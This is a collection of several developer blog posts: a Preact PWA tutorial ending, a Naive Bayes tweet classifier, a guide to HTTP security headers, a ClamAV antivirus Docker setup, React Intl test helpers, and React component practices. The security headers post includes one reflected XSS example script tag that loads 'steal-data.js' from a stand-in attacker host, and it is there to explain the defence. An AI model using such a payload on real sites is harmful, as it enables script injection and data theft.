However the best way to visualize your new Preact Progressive Web App is still on your mobile device. If your phone is on the same network, you can use the address shown by the yarn dev command, http://192.168.1.100:8080 in our example above. Of course, you can also show off and share your PWA to your friends. For this purpose, I recommend you use ngrok. ngrok will expose your local environment and you will be able to access it on your phone. You can have a more thorough review of ngrok in Matthieu Auger’s article.
Install it and run it:
yarn global add ngrok
ngrok http 8080

The output should look like:

Browse on your phone to either link and you will be able to access your PWA.
It is now time for a bit of cleaning by removing some generated documentation and files (commit) and adding a Webpack alias to make PinPic refer to the src files (commit).
Update the manifest
We can now modify our src/manifest.json to update the name of our PWA (see this commit). The manifest.json is what makes a PWA installable and handles its display (if it’s seen like a normal web page in chrome, or in a standalone app). By default preact-cli makes our PWA standalone and makes it feel like a native app.

Display a map
To display a map in our app we will use the library google-maps-react. We will start by adding the package:
yarn add google-maps-react

You can now get a Google API key from the Google Developers website and put it in src/service/api.js:
export const GOOGLE_API_KEY = '<YOUR-GOOGLE-API-KEY>';

Our next step is to create a component in src/components/maps/index.js and add in it the lines of code from this section of the google-maps-react documentation. We also need to add the GOOGLE_API_KEY to our component (as specified in this section). In your src/components/maps/index.js, import the API key into a GoogleApiWrapper and import this new component into our src/components/app.js:
...
import { GOOGLE_API_KEY } from 'PinPic/service/api';
...
export default GoogleApiWrapper({
    apiKey: GOOGLE_API_KEY,
})(MapContainer)

...
import MapContainer from './maps';
...
    render() {
        return (
            <div id=""app"">
                ...
                <MapContainer />
            </div>
        );
    }
...

Your changes should look like this commit. Finally, we can fiddle around with the style (commit) to have the whole map displayed and not hidden by the header. Your app should now perfectly display a map as background of your app. Congratulations!

Material Design Lite and React Camera
Our goal is now to use the camera/webcam of your mobile/laptop and to access it by tapping a Material Design camera button. To do that, we now need to install two new packages:
yarn add preact-mdl
yarn add react-camera

Add the Camera Button
Let’s first add the Material Design Camera button centered at the bottom of our app. From the preact-mdl package documentation we get the two links to the stylesheets. We can then import the button and icon we want along with the Material Design stylesheets. We also add some style to have it centered at the bottom of our page. In our src/components/app.js, add (commit):
...
import { Button, Icon } from 'preact-mdl'
...
                <div className=""buttonContainer"">
                    <Button
                        fab
                        colored
                        raised
                        onClick={this.toggleCameraModal}
                    >
                        <Icon icon=""camera""/>
                    </Button>
                </div>
                <link rel=""stylesheet"" href=""https://fonts.googleapis.com/icon?family=Material+Icons"" />
                <link rel=""stylesheet"" href=""https://code.getmdl.io/1.2.1/material.indigo-pink.min.css"" />
...
...
.buttonContainer {
    position: absolute;
    bottom: 0;
    padding: 10px;
    display: flex;
    align-items: center;
    width: 100%;
}


Create and display the Camera Modal
Our app now needs a modal to display the media stream from our webcam/camera. This modal will be our new component src/components/cameraModal/index.js, created from the content of this section of the react-camera documentation. Copy it and replace import React, { Component } from 'react'; by import { Component } from 'preact'; and App by CameraModal (commit). We can then import it in src/components/app.js.
...
import CameraModal from './cameraModal';
...
    render() {
        return (
            ...
            <CameraModal />
            ...
        )
    }

You can now see the CameraModal open at any time.

Make the Camera Button toggle the Modal
On our app, we now have a CameraButton that does nothing and a CameraModal that displays the video stream from our webcam/camera. The next step is to have the CameraButton toggle on and off the CameraModal. In src/components/app.js, we create a state property isCameraModalOpen set to false by default and a function toggleCameraModal that will toggle this state. Those two are to be passed to the CameraModal component. Now, in src/components/cameraModal/index.js, we handle those two new props and create a hideModal() method to manage the style of the modal (commit).
...
export default class App extends Component {
    constructor(props) {
        super(props);
        this.setState({
            isCameraModalOpen: false,
        })
        this.toggleCameraModal = this.toggleCameraModal.bind(this);
        this.setPicture = this.setPicture.bind(this);
    }

    toggleCameraModal() {
        const isCameraModalOpen = this.state.isCameraModalOpen;
        this.setState({
            isCameraModalOpen: !isCameraModalOpen
        });
    }
    ...
    render() {
        return (
            ...
            <CameraModal
                isModalOpen={this.state.isCameraModalOpen}
                toggleCameraModal={this.toggleCameraModal}
            />
        )
    }
    ...
}

...
export default class CameraModal extends Component {
    constructor(props) {
        ...
        this.hideModal = this.hideModal.bind(this);
    }
    ...
    hideModal() {
        return this.props.isModalOpen ? {top: 0, opacity: 1} : {top: '100vh', opacity: 0}
    }
    ...
    render() {
        return (
            <div
                style={{
                    ...style.container,
                    ...this.hideModal()
                }}
            >
                ...
            </div>
        )
    }
    ...
}

Your button now toggles the CameraModal on and off. I added some style to have a smoother toggle (commit) and added prop-types checks on the CameraModal (commit). I ended with a bit of code cleaning by moving the style of the components inline (commit).
Display Taken Picture
The last step of our app is now to save and display the picture taken. In src/components/app.js, we create a method setPicture that will save the picture blob in an objectURL. We then pass this method to the CameraModal.
We also display the picture on the top right of the map (commit).
Now use this method in src/components/cameraModal/index.js:
...
export default class App extends Component {
    constructor(props) {
        ...
        this.setPicture = this.setPicture.bind(this);
    }
    ...
    setPicture(picture) {
        this.img.src = URL.createObjectURL(picture);
    }
    ...
    render() {
        return (
            <div style={styles.app}>
            ...
                <div style={styles.mapContainer}>
                    <img
                        style={styles.picture}
                        ref={(img) => {
                            this.img = img;
                        }}
                    />
                    ...
                </div>
                <CameraModal
                    ...
                    setPicture={this.setPicture}
                />
            </div>
            ...
        )
    }
}

const styles = {
    ...
    picture: {
        top: 10,
        right: 10,
        position: 'absolute',
        zIndex: 10,
        height: 200,
    },
    ...
}


...
export default class CameraModal extends Component {
    ...
    static propTypes = {
        ...
        setPicture: PropTypes.func,
    }
    ...
    takePicture() {
        ...
        .then(blob => {
            this.props.setPicture(blob)
        });
        ...
    }
}

You can also remove the following lines of code from src/components/cameraModal/index.js, since it has been moved to src/components/app.js:
...
<img
    style={style.captureImage}
    ref={(img) => {
        this.img = img;
    }}
>
...


Awesome! You now have your own Preact Progressive Web App that displays a map and its pinpoints, allows you to take a picture through the webcam/camera of your device and displays it.
Conclusions
This tutorial allowed us to discover preact and to see how quick it can be used to develop a small but powerful PWA from scratch.

We created a Preact and webpack based Progressive Web App backbone using one command
We used the Google Maps API to display a map as background of our app
We added a Material Design camera button
We used the Camera Web API to take a picture and display it

If you are in Paris and interested in PWAs, I am co-organizing the Paris Progressive Web Apps Meetup once every month. Don’t hesitate and join us!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Laurent Ros
  			
  				@lros_8 • Lean Full Stack Developer @Theodo • @PwaParis Meetup Organizer • Climbing addict!  			
  		
    
			

									"
"
										This is a running blog written during my attempt to build a Trump-Obama tweet classifier in under an hour, providing a quick guide to text classification using a Naive Bayesian approach without ‘recoding the wheel’.
Note: This is less a tutorial on Machine Learning / Classifier theory, and more targeted at showing how well established classification techniques along with simple libraries can be used to build classifiers quickly for real world data.
Live demo here: https://benellerby.github.io/trump-obama-tweet-classifier/
Data
First we need labelled historic data which machine learning approaches, such as Bayesian Classifiers , rely on for training.
So we need to get past tweets of both presidents. Luckily Twitter gives us access to the last 3,200 tweets of a user, but it relies on a bit of scripting to automate the process.
Let’s start with Tweepy which is a simple Python interface to the Twitter API that should speed up the scripting side.

Note: Issues with pip install so cloned and built the package manually on OSX.

Now we need credentials so let’s go to Twitter, sign in and use the Twitter Application Console to create a new app and get credentials.

If using a placeholder for your app’s URL fails then direct it to your public GitHub page, that’s what I’ve done.

Now, there is a challenge to get the tweets as there are multiple API calls to get the list of tweet IDs and then the tweet content. To save time I found a script and adapted it for Donald Trump and Obama respectively.
After running this twice we have two JSON files of the last 3,200 tweets of each president. Yet, the JSONs are just listed as “{…}{…}” with no comma delimitation and no surrounding square brackets. This is therefore invalid JSON and needs to be fixed.

In fact it’s in the JSON Lines format. As we won’t have a scaling issue parsing this json, we can convert it to a standard JSON and parse directly through JS rather than split on “\n”.

A quick regex turns the files into usable JSON arrays. Replacing “}{“ with “},{“  and adding the two surrounding square brackets to the whole list.
Building the Classifier
Next, building a Naive Bayesian Classifier for our 2 categories, Trump and Obama.
The maths behind the classifier isn’t too complex if you’re interested.
The main decision to make is what feature set (attributes of each data element that are used in classification e.g. length, words) to use and how to implement it. Both of these are solved by the Bayes NPM package which provides a simple interface to build Naive Bayesian models from textual data.
The bayes package uses term frequency as the single, relatively simple, feature for classification. Text input is tokenized (split up into individual words without punctuation) and then a frequency table constructed mapping each token to the number of times it’s used within the document (tweet).

There are perhaps some improvements that could be made to the tokenisation such as stop word removal and stemming, but let’s see how this performs.

(Checkout the implementation, it’s ~300 lines of very readable Javascript.)
We can open up a fresh NPM project, require the Bayes package and jump into importing the JSON files… so far so good. (Don’t forget to NPM init and install)

var bayes = require('bayes');
var classifier = bayes();
var trumpTweets = require('./tweetFormatted.json');
var obamaTweets = require('./tweetFormatted2.json');

Now training the model by iterating over the president’s and then their tweets, using the tweet text attribute to get the content of the tweet. The classifier is trained with a simple call to the ‘learn’ function with each tweet.

const data = [{name: 'obama', tweets: obamaTweets}, {name: 'trump', tweets: trumpTweets}];

for (var president of data) {
  console.log(`training model with historical ${president.name} data.`)
  for (var tweet of president.tweets) {
    classifier.learn(tweet.text, president.name);
  }
}

Great, let’s try it out…

console.log(classifier.categorize('Lets build a wall!')); // Trump
console.log(classifier.categorize('I will bear hillary')); // Trump
console.log(classifier.categorize('Climate change is important.')); //Obama
console.log(classifier.categorize('Obamacare has helped americans.')); //Obama

OK! But that’s not exactly scientific. Let’s move to separating training and test data.
Model Validation
Splitting our historic data into test and training is a core principle for machine learning approaches. Training data is the data we train our model on and test data is that data we use to evaluate the model. We could take an arbitrary sample, but more interesting is to exclude each tweet individually from the training data, build a new model and then test with that individual tweet. This rotation can be used to find the average accuracy while taking advantage of as much training data as possible. In the world of ML statistics this method is called ‘leave one out cross validation’ or ‘k-folds cross validation (with k=1)’
We can achieve this exhaustive cross validation with a bit of loop logic and some counters.
A basic working implementation counting false positives, true positives, false negatives and true negatives is as follows:

var bayes = require('bayes');
var classifier = bayes();
var trumpTweets = require('./tweetFormatted.json');
var obamaTweets = require('./tweetFormatted2.json');

const data = [{name: 'trump', tweets: trumpTweets}, {name: 'obama', tweets: obamaTweets}];

var totalDataCount = trumpTweets.length + obamaTweets.length;
var tp = 0;
var tn = 0;
var fp = 0;
var fn = 0;

var t0 = new Date().getTime();

// Iterate through every historic data element index
for (var testIndex=0; testIndex&amp;lt;totalDataCount; testIndex++){
  console.log(testIndex);
  // instantiate a new model
  var classifier = bayes();
  var testData = [];
  var counter = 0;
  for (var president of data) {
    for (var tweet of president.tweets) {
      counter ++;
      if (counter === testIndex) {
        // If equal to test Index then ommit from training.
        testData.push({president: president.name, tweet: tweet});
      } else {
        // Train on all other data elements.
        classifier.learn(tweet.text, president.name);
      }
    }
  }
  // Use test data.
  for (var test of testData) {
    if (classifier.categorize(test.tweet.text) === test.president) {
      if (test.president === 'obama') {
        tp++;
      } else {
        tn ++;
      }
    } else {
      if (test.president === 'obama') {
        fp++;
      } else {
        fn++;
      }
    }
  }
}
var t1 = new Date().getTime();

console.log('total tests: ', (tp + tn + fp + fn));
console.log(`TP = ${tp}`);
console.log(`TN = ${tn}`);
console.log(`FP = ${fp}`);
console.log(`FN = ${fn}`);
console.log('Took ' + (t1 - t0) + ' milliseconds.')

Now we wait for around 40 minutes (model validation execution not included in challenge time) for each of the 6,400 models to be trained and evaluated.
It’s finished with an accuracy of 98%!
We can analyse the results as a ‘confusion matrix’ which tabulates all possible outcomes of classification success or failure (True positives (TP), False positives (FP), True Negatives (TN), False Negatives (FN)).
This is useful as accuracy alone is not a great measure for classifiers.





Predicted


Actual

Obama
Trump


Obama
3195
82


Trump
27
3123



From this we can calculate the accuracy of our model:
Accuracy = TP + TN / TP +TN +FP +FN
Accuracy = 3195 +3123 /  3195 +3123 + 27 + 82
Accuracy  = 0.98
98 %
Demo
Live demo here: https://benellerby.github.io/trump-obama-tweet-classifier/
Conclusion
This was obviously a very quick exercise in text classification using a Naive Bayesian Classifiers. We have not gone deeply into the subject, discussed Bayesian Probability or compared to other methods such as Support Vector Machines (SVM), k Nearest Neighbours (KNN) or Neural Networks. These areas are interesting, applicable and accessible without deep theoretical knowledge through libraries. I hope this quick tutorial will help you to see real world Machine Learning applications and learn by doing!
Our key steps were:

Find and clean the data
Choose an approach (Bayesian Probability, SVM, KNN or Neural Networks…)
Find a library rather than ‘recode the wheel’
Model Validation
Share your results!

Note: I challenged myself to do this in one hour, and the resulting accuracy of the model is surprising. I have not checked the data thoroughly for duplications due to time constraints, but if such an error has occurred that would contribute to the high accuracy seen. 
Let me know your results in the comments!
Takeaways: 

You can use machine learning techniques without going deep into maths and theory.
There are some great libraries to simplify machine learning application
You have access to more labelled historic data than you think; be creative.

Further Reading 

https://en.wikipedia.org/wiki/Feature_(machine_learning)
https://en.wikipedia.org/wiki/Naive_Bayes_classifier
https://en.wikipedia.org/wiki/Additive_smoothing
https://en.wikipedia.org/wiki/Support_vector_machine
https://en.wikipedia.org/wiki/K-nearest_neighbors_algorithm
https://en.wikipedia.org/wiki/Machine_learning
https://en.wikipedia.org/wiki/Artificial_neural_network


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ben Ellerby
  			
  				I'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. 

I'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.

https://www.linkedin.com/in/benjaminellerby/  			
  		
    
			

									"
"
										By default, a lot of security flaws are introduced when you create a website. A few HTTP headers added in your web server configuration can prevent basic but powerful attacks on your website. If you really have only 5 minutes, you can skip to the end and copy-paste the few lines in your server configuration file. If you have a bit more time, you can go on and read what are these flaws and how you can protect your website from: clickjacking, MIME sniffing attack, Protocol downgrade attack, and reflective XSS.
X-FRAME-OPTIONS
A common threat to websites is clickjacking. A clickjacking attack wants to make you click wherever the attacker wants you to click. This type of attack was largely used on Facebook before they implemented the protection (see here).
How does it work?
Basically, the attacker brings the user to a malicious page. However, the malicious page is hidden behind an innocent/trustworthy page, introduced in the malicious website with an iframe. The user is tricked into clicking on the regular page but he or she actually clicks on the malicious page. From this, the attacker can achieve whatever malicious action.
Below is an example, where a user is shown an interesting advertisement. While clicking on the button to enjoy the offer, the user will actually buy a car on eBay.

You can find more information here.
How to prevent clickjacking on your website ?
The X-FRAME-OPTIONS header tells the browser if another website can put your page in an iframe.

Setting its value to DENY will tell the browser to never put your page into an iframe.
Setting its value to SAMEORIGIN will tell the browser to never do it except where the host website is the same as the target website.

In most cases, you will want to add this line to your NGINX configuration file:
add_header X-Frame-Options ""DENY"";

For Apache web server you can add:
Header set X-FRAME-OPTIONS ""DENY""

X-Content-Type-Options
Sometimes, the browser tries to guess (or sniff) the type of an object (an image, a CSS file, a JavaScript file, etc). This can be used to make a browser execute some malicious JavaScript file. This issue was so important that Microsoft dedicated a security update for Internet Explorer 8 in part to it.
How does it work?
When your browser loads a file, it reads the Content-Type header to determine which type it is. If you want to display an image on your webpage, you will generally write this in an HTML page:
<img src=""https://example.com/some-image""></img>

What if the some-image file is HTML instead? If your browser is MIME sniffing the file, it will inspect the content of this file, detect that this is HTML and render the HTML content, along with JavaScript included in the HTML. This means that a user can upload an image with HTML and JavaScript as the content, this JavaScript could be executed on any user displaying this fake image.
You can find more information here.
How to prevent MIME sniffing on your website?
The X-Content-Type-Options header tells the browser if it should sniff files or not.
Setting its value to nosniff will tell the browser to never sniff the content of a file. The browser will only use a file if its Content-Type matches the HTML tag where it is used, and fail otherwise.
Here is the line to add in your NGINX configuration file:
add_header X-Content-Type-Options ""nosniff"";

For Apache web server you can add:
Header set X-Content-Type-Options ""nosniff""

Strict-Transport-Security
HTTPS is a great way to increase the security of your website and your users. However, it is possible to trick your users not to use HTTPS: once this is done, a malicious person can see what a user does on your website!
How does it work?
If you don’t know yet, HTTPS is already a huge step towards improving the security of your website (if you want to include it on your website, I advise using Let’s Encrypt). It prevents all the machines between your user and your server to see what is going on. It also guarantees that your users are talking to the correct website.
However, when visiting a website, your browser will usually try to connect over HTTP, and once the server tells that it supports HTTPS, will upgrade to a secure connection. This represents an issue as a malicious person can intercept this insecure HTTP connection: it is known as a protocol downgrade attack.
You can find more information here.
How to prevent protocol downgrade attack on your website?
There are several ways to prevent this attack. As a user, you can install HTTPS everywhere (on Chrome or Firefox) which make your browser always try HTTPS first. But you can’t force all your users to do this, fortunately, there is a server-side way.
The Strict-Transport-Security HTTP header (known as HSTS) tells the browser to connect directly with HTTPS to the website. This should be done through a redirection on your server from HTTP to HTTPS. A recommended lifetime for the HSTS header is 1 year and should include subdomains (see here).
Here is the line to add in your NGINX configuration file:
add_header Strict-Transport-Security ""max-age=31536000; includeSubDomains"";

For Apache web server you can add:
Header set Strict-Transport-Security ""max-age=31536000; includeSubDomains""

NB: This prevents the protocol downgrade attack on subsequent visits but not on the first one. You can visit the HSTS preload list website to see how you can prevent it on the first visit as well.
X-XSS-Protection
Cross-site scripting (usually referred as XSS) is a way for a malicious person to take control of the page by injecting a script. If user content is wrongly injected into a website, an attacker can execute some script on your page, and from there do virtually everything.
How does it work?
Usually, a website includes some user content. A messaging service displays the user messages.
A search engine includes the search keywords on the page. The search keywords are also a part of the URL of the search engine. A search for theodo might look like this https://duckduckgo.com/?q=theodo.
If a malicious person searches for something like <script src=""http://evil.example.com/steal-data.js""></script>, then the URL will look like https://duckduckgo.com/?q=<script+src%3D""http%3A%2F%2Fevil.example.com%2Fsteal-data.js""><%2Fscript>. If the keywords are directly injected in the search page, it will show:

And voilà, if someone tricks your users into going to the URL above, the malicious script is executed on your website on someone else’s computer.
You can find more information here.
How to prevent reflected XSS on your website?
The best way to prevent reflected XSS is to escape all user input and to make sure to inject only trusted data in your website. Most modern frameworks do this, but this is sometimes impossible to do so. Another way is to say to the browser to not execute a script tag if it matches something in the query string. You can do this by adding the header X-XSS-Protection in the HTTP response and setting its value to 1; mode=block.
Here is the line to add in your NGINX configuration file:
add_header X-XSS-Protection ""1; mode=block"";

For Apache web server you can add:
Header set X-XSS-Protection ""1; mode=block""

NB: this header actually causes more vulnerabilities on Internet Explorer 8 and older (less than 0.1% of market share). If you need to support these browsers you should disable this header when encountering these.
Exposing server information with Server and X-Powered-By
By default, NGINX and Apache display some information about the server (whether the web server is NGINX or Apache, the server version, perhaps the PHP version and the OS version).
Hiding this information will not prevent a hacker to exploit your server. However, it can direct the hacker to a particular set of attacks where your server is known to be vulnerable. These headers do not have a particular purpose and hiding them is nothing but benefitial.
Here are the lines to add in your NGINX configuration file:
server_tokens off;

// To be set in your proxy block
proxy_hide_header X-Powered-By;

For Apache web server you can add:
ServerTokens Prod

And for a PHP website served by Apache, add this in your PHP configuration file:
expose_php = Off

TL;DR here are the lines you can add to your web server configuration file
Setting a few HTTP headers on your web server can prevent some basic yet powerful attacks on your website. I advise you to do so for every website you own, where it is possible.
For NGINX, add these lines in the configuration file of your website:
add_header X-Frame-Options ""DENY"";
add_header X-Content-Type-Options ""nosniff"";
add_header Strict-Transport-Security ""max-age=31536000; includeSubDomains"";
add_header X-XSS-Protection ""1; mode=block"";
server_tokens off;

// To be set in your proxy block
proxy_hide_header X-Powered-By;

For Apache, add these lines in the configuration file of your website:
Header set X-FRAME-OPTIONS ""DENY""
Header set X-Content-Type-Options ""nosniff""
Header set Strict-Transport-Security ""max-age=31536000; includeSubDomains""
Header set X-XSS-Protection ""1; mode=block""
ServerTokens Prod

NB: if you use Expressjs, all these recommendations can be easily applied with the NPM package helmet. However, I recommend setting HTTP headers (and other concerns as compression and cache) on the web server side instead of Expressjs side because it is more efficient and improves the performance of your application.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Clément Escolano
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										I recently had to allow customers to upload files on a website, then send their content to an external API.
We had a few requirements for the files to be valid and one of them was to ensure they were checked for any virus before posting their content to the API.
Our infrastructure
Our stack was a React frontend and a Django Backend, hosted on AWS Elastic Beanstalk.
The backend was mainly designed as a proxy for all the requests that the frontend wanted to make with the external API, which means we would not be storing any of the files uploaded by the customer. We only needed to analyse the stream of the files.

We also needed to be sure that the solution would work for our development environment alongside our validation and our production platforms.
The go-to solution was to use Docker Images.
Not only could we have a quick installation for our local environments but we could use the EBS Docker configuration to setup our instances easily.
In terms of AntiVirus, ClamAV revealed itself as the only one we could use easily and for free.
We then chose 2 Docker images:

One to run the Clamd daemon and the freshclam tool (to update the virus database) as a recurring job. (https://github.com/mko-x/docker-clamav)
One to connect to the network socket of the daemon and expose a rest API we could easily use. (https://github.com/solita/clamav-rest)


Configuration
Our docker-compose.yml file looked like this for our local environment:
version: '2'

services:
  clamav-server:
    image: mkodockx/docker-clamav
  clamav-rest:
    image: lokori/clamav-rest
    links:
      - clamav-server
    environment:
      CLAMD_HOST: clamav-server
  backend:
    build: .
    command: python /code/manage.py runserver
    volumes:
      - .:/code
    ports:
      - ""8000:8000""
    links:
      - clamav-rest

Note: these images did not need any open ports because they would be called directly from your backend instance. However, the REST image needed to have the ClamaAV server as a link and the backend needed to have access to the REST!
We could replicate the same configuration as a multi-container docker configuration within AWS EBS.
Here is our Dockerrun.aws.json:
{
  ""AWSEBDockerrunVersion"": 2,
  ""containerDefinitions"": [
    {
      ""name"": ""clamav-server"",
      ""image"": ""mkodockx/docker-clamav"",
      ""essential"": true,
      ""memory"": 1024
    },
    {
      ""name"": ""clamav-rest"",
      ""image"": ""lokori/clamav-rest"",
      ""essential"": true,
      ""memory"": 512,
      ""links"": [
        ""clamav-server:clamav-server""
      ],
      ""portMappings"": [
        {
          ""hostPort"": 8080,
          ""containerPort"": 8080
        }
      ],
      ""environment"" : [
          { ""name"" : ""CLAMD_HOST"", ""value"" : ""clamav-server"" }
      ]
    }
  ]
}

Note: we went for a t2.small for the instance because the daemon and freshclam used a lot of memory when updating. (below 1GB caused us problems)
Make it rain!
Then we could use our instance with its private IP to post files on the port 8080!

In python, we could analyse the file sent from the frontend:
files = {'file': file.name}
data = {'name': file.name}
response = requests.post('http://%s:8080/scan' % settings.CLAMAV_HOST, files=files, data=data)

if not 'Everything ok : true' in response.text:
    logger.info('File %s is dangerous, preventing upload' % file.name)
    raise UploadValidationException('Virus found in the file')

Note: the rest API is returning ‘Everything ok : true’ with what seems to be a new line at the end of the string.
CLAMAV_HOST was our instance private IP on our staging and production platform, it was ‘clamav-rest’ locally.
Conclusion
It took us a few days to investigate all the possible solutions and come up with this configuration.
This not only allows you to have a fast solution but also a reliable one thanks to ElasticBeanstalk.
I hope it will help anyone who needs to have a quick implementation of an antivirus 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Clément Pasteau
  			
  				Agile Web Engineer at Theodo UK  			
  		
    
			

									"
"
										Why is it important?
While programming on a project, you run your tests all the time, so it’s important not to lose time analysing the results of your tests.
We want to immediatly spot which tests are failing, not being disturb by any flashing red false negative errors, which take all the place in your console and make you miss the important information.
On the project I’m working on, the output of our tests was this kind of mess:

That’s why we decided to create this standard on our project:

If my tests are passing, there must be no errors in the output of the test command

So we started to tackle this issue, and noticed that 100% of our errors in tests were either due to required props we forgot to pass to components, or errors from the React Intl library.
I explain here how we managed to remove all these annoying React Intl errors from our tests:

How to avoid console errors from React-Intl?
The library complains that it does not know the translation for a message you want to render, because you did not pass them to the IntlProvider which wrap your components in your tests:

console.error node_modules/react-intl/lib/index.js:706
[React Intl] Missing message: “LOGIN_USERNAME_LABEL” for locale: “en”
console.error node_modules/react-intl/lib/index.js:725
[React Intl] Cannot format message: “LOGIN_USERNAME_LABEL”, using message id as fallback.

There are two ways to remove these errors.


The first one consists in explicitly giving the translations to the provider.
It has the benefit of writting the real translations in your shallowed components instead of the translation keys, which makes snapshots more readable.
It is easy to implement when you already have all your translations written in a file.
However, it can be a bit tedious when your translations come from an API, because you have to update the list with the new translation every time you add a message.


The second solution works without having to update a list of translations, by automatically setting for every message a defaultMessage property equal to the message id.
This will not impact your snapshots: you will still have the message id and not its translation.


1st solution: explicitly give the translations to your tests

You have to write all your translations in a JSON file, which looks like this:

// tests/locales/en.json

{
  ""LOGIN_USERNAME_LABEL"": ""Username"",
  ""LOGIN_PASSWORD_LABEL"": ""Password"",
  ""LOGIN_BUTTON"": ""Login"",
}


Each time you mount or shallow a component, you should pass it as a messages props in the IntlProvider which wraps the component:

// components/LoginButton/tests/LoginButton.test.js

import React from 'react';
import { IntlProvider } from 'react-intl';

import LoginButton from 'components/LoginButton';
import enTranslations from 'tests/locales/en.json';

it('calls login function on click', () => {
  const login = jest.fn();
  const renderedLoginButton = mount(
    <IntlProvider locale='en' messages={enTranslations}>
      <LoginButton login={login} />
    </IntlProvider>
  );
  renderedLoginButton.find('button').simulate('click');
  expect(loginFunction.toHaveBeenCalled).toEqual(true);
});

But actually, if you respect what is advised by React Intl documentation to shallow or mount components with Intl, you already have mountWithIntl and shallowWithIntl helper functions, and you pass your messages in the IntlProvider defined in these functions:
// tests/helpers/intlHelpers.js

import React from 'react';
import { IntlProvider, intlShape } from 'react-intl';
import { mount, shallow } from 'enzyme';

import enTranslations from 'tests/locales/en.json';

// You pass your translations here:
const intlProvider = new IntlProvider({
    locale: 'en',
    messages: enTranslations
}, {});

const { intl } = intlProvider.getChildContext();

function nodeWithIntlProp(node) {
    return React.cloneElement(node, { intl });
}

export function shallowWithIntl(node, { context } = {}) {
    return shallow(
        nodeWithIntlProp(node),
        {
            context: Object.assign({}, context, { intl }),
        }
    );
}

export function mountWithIntl(node, { context, childContextTypes } = {}) {
    return mount(
        nodeWithIntlProp(node),
        {
            context: Object.assign({}, context, { intl }),
            childContextTypes: Object.assign({},
                { intl: intlShape },
                childContextTypes
            )
        }
    );
}

And you can use these functions instead of mount and shallow:
// components/LoginButton/tests/LoginButton.test.js

import React from 'react';

import LoginButton from 'components/LoginButton';
import { mountWithIntl } from 'tests/helpers/intlHelpers';
import enTranslations from 'tests/locales/en.json';

it('calls login function on click', () => {
  const login = jest.fn();
  const renderedLoginButton = mountWithIntl(<LoginButton login={login} />);
  renderedLoginButton.find('button').simulate('click');
  expect(loginFunction.toHaveBeenCalled).toEqual(true);
});

2nd solution: pass a customized intl object to your shallowed and mounted components
Unlike the previous one, this solution works without having to update a list of translations, by using a customized intl object in your tests.
Customize the intl object
The idea is to modify the formatMessage method which is in the intl object passed to your component.
You have to make this formatMessage automatically add a defaultMessage property to a translation which does not already have one, setting its value the same as the translation id.
If we call originalIntl the intl object before customizing it, here is how you can do it:
const intl = {
  ...originalIntl,
  formatMessage: ({ id, defaultMessage }) =>
    originalIntl.formatMessage({
        id,
        defaultMessage: defaultMessage || id
    }),
};

How to use this customized intl in your tests
As in the previous solution, we’re going to modify the intlHelpers that React Intl documentation advise to use in tests.
The idea is to modify the two helper functions mountWithIntl and shallowWithIntl to give to the component our custom intl object instead of the original one.
In order to make the defaultMessage properties taken into account, you also have to give a defaultLocale props to the IntlProvider, with the same value as the locale props.
Here is the modified intlHeplers file:
// tests/helpers/intlHelpers.js

import React from 'react';
import { IntlProvider, intlShape } from 'react-intl';
import { mount, shallow } from 'enzyme';

import enTranslations from 'tests/locales/en.json';

// You give the default locale here:
const intlProvider = new IntlProvider({
    locale: 'en',
    defaulLocale: 'en'
}, {});

// You customize the intl object here:
const { intl: originalIntl } = intlProvider.getChildContext();
const intl = {
  ...originalIntl,
  formatMessage: ({ id, defaultMessage }) =>
    originalIntl.formatMessage({
        id,
        defaultMessage: defaultMessage || id
    }),
};
function nodeWithIntlProp(node) {
    return React.cloneElement(node, { intl });
}

export function shallowWithIntl(node, { context } = {}) {
    return shallow(
        nodeWithIntlProp(node),
        {
            context: Object.assign({}, context, { intl }),
        }
    );
}

export function mountWithIntl(node, { context, childContextTypes } = {}) {
    return mount(
        nodeWithIntlProp(node),
        {
            context: Object.assign({}, context, { intl }),
            childContextTypes: Object.assign({},
                { intl: intlShape },
                childContextTypes
            )
        }
    );
}

Then, you only have to use these functions instead of mount and shallow and all the warnings from React Intl will disappear from your shell.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Yannick Wolff
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										What is the perfect React component?

The component should have one purpose only, rendering
The component should be small and easily understandable
The component should rerender only if needed

How to create the perfect React component?

Logic Functions
Atomic Design
Selectors and Reselectors
Functions inside render

Logic Functions

Export your logic functions to an external service

Functions other than lifecycle methods should only return JSX objects
Logic functions can then be easily reused in other components
Logic functions can then be unit tested
Component is easy to read



Bad Example
// MyComponent.js
export default class MyComponent extends PureComponent {
   computeAndDoStuff = prop1, prop2 => {
      // Logic that returns something depending on the props passed
   }

   render() {
      <div>
         {this.computeAndDoStuff(this.props.prop1, this.props.prop2) && <span>Hello</span>}
      </div>
   }
}

MyComponent.propTypes = {
   prop1,
   prop2,
}

const mapStateToProps = state => {
   prop1: state.object.prop1,
   prop2: state.object.prop2,
}

export const MyComponentContainer = connect(mapStateToProps)(MyComponent)


✗ Component is doing more than just rendering, it is doing logic inside
✗ Component needs multiple snapshots to test the logic of the function

Good Example
// MyComponent.js
import { computeAndDoStuff } from '@services/computingService'

export default class MyComponent extends PureComponent {
   render() {
      <div>
         {computeAndDoStuff(this.props.prop1, this.props.prop2) && <span>Hello</span>}
      </div>
   }
}

MyComponent.propTypes = {
   prop1,
   prop2,
}

const mapStateToProps = state => {
   prop1: state.object.prop1,
   prop2: state.object.prop2,
}

export const MyComponentContainer = connect(mapStateToProps)(MyComponent)

// computingService.js
export computeAndDoStuff = prop1, prop2 => {
   // Logic that returns something depending on the props passed
}


✔︎ Component has only one role, render
✔︎ Component needs only 2 snapshots, depending on if the result of the function is true or false
